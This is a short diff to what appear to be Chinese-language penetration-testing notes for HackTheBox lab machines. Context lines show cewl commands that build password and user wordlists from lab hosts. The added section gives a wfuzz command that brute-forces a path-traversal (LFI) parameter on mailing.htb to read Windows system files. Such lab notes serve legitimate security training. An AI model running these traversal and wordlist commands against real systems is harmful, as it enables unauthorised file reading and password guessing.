@@ -67,3 +67,9 @@ cewl --with-numbers -w passwd.txt http://fuse.fabricorp.local/papercut/logs/html
 
 cewl -d 1 -m 3 -w user.txt 10.10.10.175
 ```
+
+# LFI爆破
+
+```
+wfuzz -c -w /usr/share/wordlists/SecLists-2023.2/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt --hw 0 http://mailing.htb/download.php?file=../../../../../../../FUZZ 
+```
